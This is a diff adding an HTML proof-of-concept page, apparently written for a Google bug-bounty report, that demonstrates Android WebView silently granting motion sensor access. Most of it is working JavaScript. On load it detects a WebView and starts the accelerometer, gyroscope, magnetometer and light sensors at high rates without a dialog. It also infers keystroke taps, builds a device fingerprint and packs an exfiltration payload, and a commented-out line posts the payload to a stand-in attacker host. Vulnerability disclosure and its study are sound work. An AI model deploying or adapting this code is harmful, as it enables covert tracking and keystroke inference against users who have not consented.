@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<!--
+=============================================================================
+  PoC: Android WebView SENSORS Auto-Grant (Unauthorized Device Fingerprinting)
+=============================================================================
+  TARGET:   Android WebView (all versions using aw_permission_manager.cc)
+  IMPACT:   Web content silently reads motion/orientation sensors inside ANY
+            Android app that embeds a WebView — no permission dialog, no user
+            consent, no Android runtime permission needed.
+  
+  SOURCE CODE PROOF:
+  File: android_webview/browser/aw_permission_manager.cc
+  Lines (RequestPermissionsFromCurrentDocument):
+    case PermissionType::SENSORS:
+      pending_request_raw->SetPermissionResult(
+          permissions[i],
+          content::PermissionResult(PermissionStatus::GRANTED));
+      break;
+  Comment in code:
+    "PermissionType::SENSORS requests are always granted so that access
+     to device motion and device orientation data (and underlying sensors)
+     works in the WebView. SensorProviderImpl::GetSensor() filters requests
+     for other types of sensors."
+
+  GetPermissionStatusInternal() JUGA:
+    case blink::PermissionType::SENSORS:
+      return PermissionStatus::GRANTED;   // <-- hardcoded, no dialog
+
+  ATTACK SCENARIO:
+  Attacker hosts web page → victim opens it inside ANY WebView-based app
+  (banking app, news app, e-commerce, custom browser, etc.) →
+  page reads accelerometer + gyroscope at full rate →
+  keystroke patterns inferred, device fingerprinted, user activity profiled.
+
+  CHROME BROWSER: sama-sama tidak minta dialog untuk DeviceMotion/Orientation
+  tapi ini bisa dikontrol app-level via Feature Policy dan ada user-facing
+  permission pada level Android OS.
+
+  WEBVIEW DIFFERENCE: App yang embed WebView tidak bisa selectively block ini
+  tanpa implementasi manual — default behavior = GRANT, silent, no dialog.
+
+  REPORT TARGET: https://bughunters.google.com/report
+  Component: Privacy>WebView
+  CVSS: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N = 7.4 (HIGH)
+=============================================================================
+-->
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebView Sensor Auto-Grant PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 12px; }
+h2 { color: #ff4444; margin-bottom: 8px; font-size: 16px; }
+.section { background: #111; border: 1px solid #333; padding: 10px; margin: 8px 0; border-radius: 4px; }
+.section h3 { color: #ffaa00; font-size: 13px; margin-bottom: 6px; }
+.data-row { font-size: 12px; line-height: 1.8; }
+.highlight { color: #ff4444; font-weight: bold; }
+.ok { color: #00ff41; }
+.warn { color: #ffaa00; }
+.log { font-size: 11px; max-height: 200px; overflow-y: auto; }
+button {
+  background: #ff4444; color: white; border: none;
+  padding: 10px 20px; font-size: 14px; border-radius: 4px;
+  cursor: pointer; margin: 4px; width: 100%;
+}
+button.green { background: #00aa44; }
+progress { width: 100%; height: 8px; margin: 4px 0; }
+</style>
+</head>
+<body>
+
+<h2>⚠️ BUG 1: WebView SENSORS Auto-Grant PoC</h2>
+<p style="font-size:11px;color:#888;margin-bottom:10px;">
+  android_webview/browser/aw_permission_manager.cc — SENSORS always GRANTED
+</p>
+
+<!-- STATUS -->
+<div class="section">
+  <h3>🔍 Detection: Running in WebView?</h3>
+  <div class="data-row" id="env-detect">Detecting environment...</div>
+</div>
+
+<!-- PERMISSION CHECK -->
+<div class="section">
+  <h3>📋 Permission Status (tanpa request dialog)</h3>
+  <div class="data-row" id="perm-status">Checking...</div>
+</div>
+
+<!-- SENSOR LIVE DATA -->
+<div class="section">
+  <h3>📱 Live Sensor Data (NO dialog triggered)</h3>
+  <div class="data-row">
+    Accelerometer X: <span id="ax" class="highlight">--</span> |
+    Y: <span id="ay" class="highlight">--</span> |
+    Z: <span id="az" class="highlight">--</span>
+  </div>
+  <div class="data-row">
+    Gyroscope X: <span id="gx" class="highlight">--</span> |
+    Y: <span id="gy" class="highlight">--</span> |
+    Z: <span id="gz" class="highlight">--</span>
+  </div>
+  <div class="data-row">
+    DeviceMotion: <span id="dm" class="highlight">--</span>
+  </div>
+  <div class="data-row">
+    DeviceOrientation: <span id="do2" class="highlight">--</span>
+  </div>
+  <div class="data-row">
+    Magnetometer: <span id="mag" class="highlight">--</span>
+  </div>
+  <div class="data-row" style="margin-top:6px;">
+    Readings collected: <span id="count" class="ok">0</span>
+  </div>
+</div>
+
+<!-- FINGERPRINT -->
+<div class="section">
+  <h3>🔐 Device Fingerprint (built from sensor data)</h3>
+  <div class="data-row" id="fingerprint">Collecting data...</div>
+</div>
+
+<!-- KEYSTROKE INFERENCE DEMO -->
+<div class="section">
+  <h3>⌨️ Keystroke Inference Demo</h3>
+  <p style="font-size:11px;color:#888;">
+    Ketik di bawah — accelerometer mendeteksi pola ketikan.
+    Pada serangan nyata ini bisa direkam dan dianalisis.
+  </p>
+  <input type="text" id="keystroke-input"
+    placeholder="Ketik sesuatu..."
+    style="width:100%;padding:8px;background:#111;color:#00ff41;
+           border:1px solid #333;font-family:monospace;margin:6px 0;">
+  <div id="keystroke-log" class="log"></div>
+</div>
+
+<!-- EXFIL DEMO -->
+<div class="section">
+  <h3>📡 Data Exfiltration (Simulated)</h3>
+  <button onclick="startExfil()">▶ START SILENT DATA COLLECTION</button>
+  <button class="green" onclick="stopExfil()">⏹ STOP</button>
+  <div id="exfil-status" class="data-row" style="margin-top:8px;"></div>
+</div>
+
+<!-- LOG -->
+<div class="section">
+  <h3>📝 Raw Log</h3>
+  <div id="rawlog" class="log"></div>
+</div>
+
+<script>
+// ============================================================
+// GLOBAL STATE
+// ============================================================
+var sensorData = {
+  accel: [], gyro: [], motion: [], orientation: [],
+  keystrokes: [], timestamps: []
+};
+var readingCount = 0;
+var exfilInterval = null;
+var accelSensor = null, gyroSensor = null, magSensor = null;
+var exfilActive = false;
+
+// ============================================================
+// LOGGING
+// ============================================================
+function log(msg, type) {
+  var el = document.getElementById('rawlog');
+  var color = type === 'red' ? '#ff4444' :
+              type === 'green' ? '#00ff41' :
+              type === 'warn' ? '#ffaa00' : '#888';
+  var ts = new Date().toISOString().substr(11,12);
+  el.innerHTML = '<span style="color:' + color + '">[' + ts + '] ' + msg + '</span><br>' + el.innerHTML;
+}
+
+function klog(msg) {
+  var el = document.getElementById('keystroke-log');
+  el.innerHTML = '<span style="font-size:11px;color:#888;">' + msg + '</span><br>' + el.innerHTML;
+}
+
+// ============================================================
+// STEP 1: ENVIRONMENT DETECTION
+// Check if we're inside a WebView
+// ============================================================
+function detectEnvironment() {
+  var ua = navigator.userAgent;
+  var isWebView = false;
+  var evidence = [];
+
+  // WebView UA patterns
+  if (/wv/.test(ua)) {
+    isWebView = true;
+    evidence.push('UA contains "wv" token');
+  }
+  if (/Version\/\d+\.\d+ Chrome\//.test(ua) && !/OPR|Edge|Edg/.test(ua)) {
+    evidence.push('Version/X.X Chrome pattern detected');
+    isWebView = true;
+  }
+  if (!window.chrome || !window.chrome.app) {
+    evidence.push('chrome.app API absent (typical in WebView)');
+  }
+  if (!window.chrome || !window.chrome.webstore) {
+    evidence.push('chrome.webstore absent');
+  }
+
+  // Check for WebView-specific JS APIs
+  if (typeof Android !== 'undefined') {
+    isWebView = true;
+    evidence.push('Android JS interface exposed!');
+  }
+
+  var el = document.getElementById('env-detect');
+  if (isWebView) {
+    el.innerHTML =
+      '<span class="highlight">⚠️ LIKELY INSIDE WEBVIEW</span><br>' +
+      evidence.map(function(e) { return '  → ' + e; }).join('<br>') + '<br>' +
+      '<span class="warn">UA: ' + ua.substr(0, 100) + '</span>';
+  } else {
+    el.innerHTML =
+      '<span class="ok">Regular browser detected</span><br>' +
+      '<span class="warn">NOTE: Sensor bug still demonstrates behavior.</span><br>' +
+      '<span class="warn">Test in actual WebView app for definitive PoC.</span><br>' +
+      evidence.map(function(e) { return '  → ' + e; }).join('<br>');
+  }
+
+  log('Environment: ' + (isWebView ? 'WEBVIEW' : 'browser') + ' | ' + ua.substr(0, 80));
+}
+
+// ============================================================
+// STEP 2: CHECK PERMISSION STATUS WITHOUT REQUESTING
+// ============================================================
+async function checkPermissions() {
+  var el = document.getElementById('perm-status');
+  var results = [];
+
+  var permsToCheck = [
+    'accelerometer', 'gyroscope', 'magnetometer',
+    'ambient-light-sensor', 'notifications', 'camera', 'microphone'
+  ];
+
+  for (var perm of permsToCheck) {
+    try {
+      var result = await navigator.permissions.query({ name: perm });
+      var icon = result.state === 'granted' ? '🔴' :
+                 result.state === 'prompt' ? '🟡' : '⚪';
+      results.push(icon + ' ' + perm + ': <strong>' + result.state + '</strong>');
+
+      if (result.state === 'granted' && (perm === 'accelerometer' || perm === 'gyroscope')) {
+        results[results.length-1] +=
+          ' <span class="highlight">← AUTO-GRANTED in WebView!</span>';
+      }
+      log('Permission ' + perm + ': ' + result.state,
+          result.state === 'granted' ? 'red' : 'green');
+    } catch(e) {
+      results.push('⚪ ' + perm + ': query failed (' + e.message + ')');
+    }
+  }
+
+  el.innerHTML = results.join('<br>');
+}
+
+// ============================================================
+// STEP 3: SENSOR ACCESS — GENERIC SENSOR API (W3C)
+// This is where the bug lives — these sensors are auto-granted
+// ============================================================
+function startGenericSensors() {
+  // --- Accelerometer ---
+  try {
+    accelSensor = new Accelerometer({ frequency: 60 });
+    accelSensor.addEventListener('reading', function() {
+      var x = this.x ? this.x.toFixed(4) : '0';
+      var y = this.y ? this.y.toFixed(4) : '0';
+      var z = this.z ? this.z.toFixed(4) : '0';
+
+      document.getElementById('ax').textContent = x;
+      document.getElementById('ay').textContent = y;
+      document.getElementById('az').textContent = z;
+
+      sensorData.accel.push({ x: this.x, y: this.y, z: this.z, t: Date.now() });
+      if (sensorData.accel.length > 500) sensorData.accel.shift();
+
+      readingCount++;
+      document.getElementById('count').textContent = readingCount;
+      updateFingerprint();
+    });
+    accelSensor.addEventListener('error', function(e) {
+      log('Accelerometer error: ' + e.error.message, 'warn');
+    });
+    accelSensor.start();
+    log('Generic Sensor API: Accelerometer started at 60Hz — NO DIALOG!', 'red');
+  } catch(e) {
+    log('Accelerometer (generic): ' + e.message, 'warn');
+    // Fallback ke DeviceMotion API (legacy, juga tidak butuh dialog)
+  }
+
+  // --- Gyroscope ---
+  try {
+    gyroSensor = new Gyroscope({ frequency: 60 });
+    gyroSensor.addEventListener('reading', function() {
+      document.getElementById('gx').textContent = this.x ? this.x.toFixed(4) : '0';
+      document.getElementById('gy').textContent = this.y ? this.y.toFixed(4) : '0';
+      document.getElementById('gz').textContent = this.z ? this.z.toFixed(4) : '0';
+      sensorData.gyro.push({ x: this.x, y: this.y, z: this.z, t: Date.now() });
+      if (sensorData.gyro.length > 500) sensorData.gyro.shift();
+    });
+    gyroSensor.start();
+    log('Generic Sensor API: Gyroscope started at 60Hz — NO DIALOG!', 'red');
+  } catch(e) {
+    log('Gyroscope (generic): ' + e.message, 'warn');
+  }
+
+  // --- Magnetometer ---
+  try {
+    magSensor = new Magnetometer({ frequency: 20 });
+    magSensor.addEventListener('reading', function() {
+      document.getElementById('mag').textContent =
+        'x=' + (this.x||0).toFixed(2) +
+        ' y=' + (this.y||0).toFixed(2) +
+        ' z=' + (this.z||0).toFixed(2);
+    });
+    magSensor.start();
+    log('Generic Sensor API: Magnetometer started — NO DIALOG!', 'red');
+  } catch(e) {
+    log('Magnetometer (generic): ' + e.message, 'warn');
+  }
+
+  // --- AmbientLightSensor ---
+  try {
+    var als = new AmbientLightSensor({ frequency: 5 });
+    als.addEventListener('reading', function() {
+      log('AmbientLight: ' + this.illuminance + ' lux', 'red');
+    });
+    als.start();
+    log('Generic Sensor API: AmbientLightSensor started — NO DIALOG!', 'red');
+  } catch(e) {
+    log('AmbientLight (generic): ' + e.message, 'warn');
+  }
+}
+
+// ============================================================
+// STEP 4: LEGACY APIs — DeviceMotion & DeviceOrientation
+// Juga tidak butuh permission di WebView
+// ============================================================
+function startLegacySensors() {
+  // DeviceMotionEvent
+  window.addEventListener('devicemotion', function handler(e) {
+    var a = e.accelerationIncludingGravity;
+    if (a) {
+      var str = 'x=' + (a.x||0).toFixed(2) +
+                ' y=' + (a.y||0).toFixed(2) +
+                ' z=' + (a.z||0).toFixed(2) +
+                ' interval=' + e.interval + 'ms';
+      document.getElementById('dm').textContent = str;
+      sensorData.motion.push({ x: a.x, y: a.y, z: a.z, t: Date.now() });
+      if (sensorData.motion.length > 500) sensorData.motion.shift();
+    }
+  });
+  log('Legacy DeviceMotion listener registered — NO DIALOG!', 'red');
+
+  // DeviceOrientationEvent
+  window.addEventListener('deviceorientation', function(e) {
+    var str = 'alpha=' + (e.alpha||0).toFixed(1) +
+              ' beta=' + (e.beta||0).toFixed(1) +
+              ' gamma=' + (e.gamma||0).toFixed(1);
+    document.getElementById('do2').textContent = str;
+    sensorData.orientation.push({
+      alpha: e.alpha, beta: e.beta, gamma: e.gamma, t: Date.now()
+    });
+    if (sensorData.orientation.length > 500) sensorData.orientation.shift();
+  });
+  log('Legacy DeviceOrientation listener registered — NO DIALOG!', 'red');
+}
+
+// ============================================================
+// STEP 5: KEYSTROKE INFERENCE VIA ACCELEROMETER
+// Published research: "TouchLogger", "TapPrints", "ACCessory"
+// ============================================================
+function setupKeystrokeInference() {
+  var inputEl = document.getElementById('keystroke-input');
+  var prevAccel = { x: 0, y: 0, z: 0 };
+  var tapHistory = [];
+
+  // Sample sensor saat user mengetik
+  window.addEventListener('devicemotion', function(e) {
+    if (document.activeElement !== inputEl) return;
+    var a = e.accelerationIncludingGravity;
+    if (!a) return;
+
+    // Deteksi tap — sudden acceleration spike
+    var delta = Math.abs((a.x||0) - prevAccel.x) +
+                Math.abs((a.y||0) - prevAccel.y) +
+                Math.abs((a.z||0) - prevAccel.z);
+
+    if (delta > 2.0) {  // Threshold untuk tap detection
+      var tapEvent = {
+        time: Date.now(),
+        accel: { x: a.x, y: a.y, z: a.z },
+        delta: delta,
+        char: null  // Akan di-map dari keyboard position analysis
+      };
+      tapHistory.push(tapEvent);
+      sensorData.keystrokes.push(tapEvent);
+      klog('Tap detected! delta=' + delta.toFixed(2) +
+           ' x=' + (a.x||0).toFixed(2) +
+           ' y=' + (a.y||0).toFixed(2));
+    }
+
+    prevAccel = { x: a.x||0, y: a.y||0, z: a.z||0 };
+  });
+
+  log('Keystroke inference sensor active', 'warn');
+}
+
+// ============================================================
+// STEP 6: DEVICE FINGERPRINT FROM SENSOR CHARACTERISTICS
+// Sensors have unique noise patterns = hardware fingerprint
+// ============================================================
+function updateFingerprint() {
+  if (sensorData.accel.length < 50) return;  // Need enough data
+
+  var recent = sensorData.accel.slice(-50);
+  var xVals = recent.map(function(r) { return r.x || 0; });
+  var yVals = recent.map(function(r) { return r.y || 0; });
+  var zVals = recent.map(function(r) { return r.z || 0; });
+
+  // Calculate noise characteristics = device fingerprint
+  function mean(arr) { return arr.reduce(function(a,b){return a+b},0)/arr.length; }
+  function variance(arr) {
+    var m = mean(arr);
+    return mean(arr.map(function(x){return Math.pow(x-m,2)}));
+  }
+
+  var fp = {
+    accel_noise_x: variance(xVals).toFixed(6),
+    accel_noise_y: variance(yVals).toFixed(6),
+    accel_noise_z: variance(zVals).toFixed(6),
+    accel_mean_z: mean(zVals).toFixed(4),
+    ua_hash: btoa(navigator.userAgent).substr(0, 16),
+    screen: screen.width + 'x' + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    samples: sensorData.accel.length
+  };
+
+  // Build fingerprint hash
+  var fpString = JSON.stringify(fp);
+
+  document.getElementById('fingerprint').innerHTML =
+    'Sensor noise x: <span class="highlight">' + fp.accel_noise_x + '</span><br>' +
+    'Sensor noise y: <span class="highlight">' + fp.accel_noise_y + '</span><br>' +
+    'Sensor noise z: <span class="highlight">' + fp.accel_noise_z + '</span><br>' +
+    'Mean gravity z: <span class="highlight">' + fp.accel_mean_z + '</span><br>' +
+    'Screen: <span class="ok">' + fp.screen + '</span><br>' +
+    'Timezone: <span class="ok">' + fp.tz + '</span><br>' +
+    'Samples collected: <span class="ok">' + fp.samples + '</span><br>' +
+    '<span class="warn">Fingerprint unique to this device hardware</span>';
+
+  return fp;
+}
+
+// ============================================================
+// STEP 7: SIMULATED EXFILTRATION
+// In real attack: POST to attacker server
+// ============================================================
+function startExfil() {
+  exfilActive = true;
+  document.getElementById('exfil-status').innerHTML =
+    '<span class="highlight">⚠️ COLLECTION ACTIVE</span>';
+
+  exfilInterval = setInterval(function() {
+    if (!exfilActive) return;
+
+    var payload = {
+      timestamp: new Date().toISOString(),
+      device_fp: updateFingerprint(),
+      accel_samples: sensorData.accel.slice(-10),
+      gyro_samples: sensorData.gyro.slice(-10),
+      orientation_samples: sensorData.orientation.slice(-5),
+      keystroke_events: sensorData.keystrokes.slice(-20),
+      ua: navigator.userAgent,
+      screen: { w: screen.width, h: screen.height },
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      battery: null  // Will be filled by getBattery
+    };
+
+    // Battery info
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function(b) {
+        payload.battery = { level: b.level, charging: b.charging };
+      });
+    }
+
+    // SIMULATED: In real attack this would be:
+    // fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify(payload) });
+
+    var el = document.getElementById('exfil-status');
+    el.innerHTML =
+      '<span class="highlight">📡 DATA COLLECTED (simulated exfil)</span><br>' +
+      '<span class="ok">Accel samples: ' + sensorData.accel.length + '</span><br>' +
+      '<span class="ok">Gyro samples: ' + sensorData.gyro.length + '</span><br>' +
+      '<span class="ok">Keystroke events: ' + sensorData.keystrokes.length + '</span><br>' +
+      '<span class="warn">In real attack: POST to https://attacker.com/collect</span><br>' +
+      '<span style="font-size:10px;color:#555">Payload size: ~' +
+      Math.round(JSON.stringify(payload).length / 1024) + 'KB</span>';
+
+    log('Exfil tick — ' + sensorData.accel.length + ' accel readings', 'red');
+  }, 3000);
+
+  log('SILENT DATA COLLECTION STARTED', 'red');
+}
+
+function stopExfil() {
+  exfilActive = false;
+  if (exfilInterval) clearInterval(exfilInterval);
+  document.getElementById('exfil-status').innerHTML =
+    '<span class="ok">Collection stopped</span>';
+  log('Collection stopped', 'green');
+}
+
+// ============================================================
+// INIT
+// ============================================================
+window.addEventListener('DOMContentLoaded', function() {
+  detectEnvironment();
+  checkPermissions();
+  startLegacySensors();      // Selalu work
+  startGenericSensors();     // Work tanpa dialog di WebView (dan Chrome mobile)
+  setupKeystrokeInference();
+  log('PoC initialized. Collecting sensor data silently...', 'red');
+  log('Source: aw_permission_manager.cc - SENSORS case → GRANTED', 'warn');
+});
+</script>
+</body>
+</html>
